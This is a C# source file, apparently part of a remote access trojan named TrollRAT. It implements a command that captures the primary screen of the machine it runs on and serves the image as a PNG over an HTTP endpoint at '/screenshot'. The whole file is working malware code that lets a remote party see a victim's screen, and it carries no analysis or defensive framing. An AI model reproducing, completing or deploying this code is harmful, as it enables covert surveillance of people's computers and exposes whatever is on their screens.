using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace TrollRAT.Server.Commands
{
    public class ScreenshotCommand : WebServerCommandBase
    {
        public override Regex Path => new Regex("^/screenshot(\\.png)?$");

        public override void execute(HttpListenerContext context)
        {
            var bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            var graphics = Graphics.FromImage(bitmap);

            graphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y,
                0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);

            var stream = new MemoryStream();
            bitmap.Save(stream, ImageFormat.Png);

            respondBytes(stream.ToArray(), context.Response, "image/png");

            graphics.Dispose();
            bitmap.Dispose();
            stream.Close();
        }
    }
}
